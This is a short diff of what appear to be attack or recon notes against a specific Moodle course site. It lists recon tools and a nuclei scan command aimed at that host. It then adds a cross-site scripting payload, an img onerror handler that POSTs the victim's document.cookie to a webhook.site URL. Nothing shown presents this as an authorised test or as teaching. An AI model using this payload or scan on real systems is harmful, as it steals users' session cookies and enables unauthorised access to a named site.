@@ -17,4 +17,6 @@ extensão dotgit, wappalyzer, shodan, DNSlytics
 
 nuclei -u https://cursos.rizomasur.org -tags moodle
 
+`
 <img src="x" onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
+`
